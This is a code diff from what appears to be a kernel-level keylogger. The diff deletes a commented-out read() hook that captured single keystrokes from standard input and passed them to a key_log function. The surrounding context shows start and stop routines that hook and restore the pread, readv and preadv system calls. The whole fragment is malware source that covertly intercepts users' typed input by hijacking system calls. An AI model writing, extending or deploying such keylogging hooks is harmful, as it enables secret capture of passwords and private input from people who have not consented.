@@ -132,35 +132,11 @@ static int preadv_hook(struct thread *td, void *syscall_args) {
 
     return(error);
     }	    
-/*
-static int read_hook(struct thread *td, void *syscall_args) {
-    struct read_args  {
-    int fd;
-    void *buf;
-    size_t nbyte;
-    }  *uap;
 
-    uap = (struct read_args *)syscall_args;
-    int error;
-    char buf[1];
-    int done;
-    error = sys_read(td, syscall_args);
-    if (error || (!uap->nbyte) || (uap->nbyte > 1) || (uap->fd != 0))
-        return(error);
-    copyinstr(uap->buf, buf, 1, &done);
-
-    int keyError = key_log(td, buf);
-    if(keyError)
-	return(keyError);
-
-    return(error);
-    }
-*/
 
 void start_keylog(void)
 {
 	hook_syscall_set(SYS_pread, pread_hook);
-	//hook_syscall_set(SYS_read, read_hook);
         hook_syscall_set(SYS_readv, readv_hook);
 	hook_syscall_set(SYS_preadv, preadv_hook);
 }
@@ -168,7 +144,6 @@ void start_keylog(void)
 void stop_keylog(void)
 {
         hook_syscall_set(SYS_pread, sys_pread);
-	//hook_syscall_set(SYS_read, sys_read);
         hook_syscall_set(SYS_readv, sys_readv);
 	hook_syscall_set(SYS_preadv, sys_preadv);
 }
